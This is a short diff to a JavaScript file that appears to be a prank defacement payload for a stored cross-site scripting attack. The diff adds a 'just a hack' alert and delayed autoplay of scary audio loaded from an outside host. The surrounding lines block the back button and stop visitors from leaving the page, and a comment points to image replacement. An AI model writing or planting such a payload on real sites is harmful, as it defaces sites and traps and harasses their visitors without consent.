@@ -1,3 +1,5 @@
+alert('Ha-ha! Just a hack by Daffier');
+
 // Отмена возврата (частично)
 
 window.history.pushState(null, null, window.location.href);
@@ -10,6 +12,15 @@ window.addEventListener('beforeunload', function (e) {
     e.preventDefault();
     e.returnValue = '';
 });
+
+
+// Запуск музыки
+
+setTimeout(function () {
+    var scaryMusic = document.createElement("audio");
+    scaryMusic.src = "https://0-dayff13r.github.io/Stored-XSS-scary/scary.mp3";
+    scaryMusic.play();
+}, 1000);
 
 
 // Замена изображений
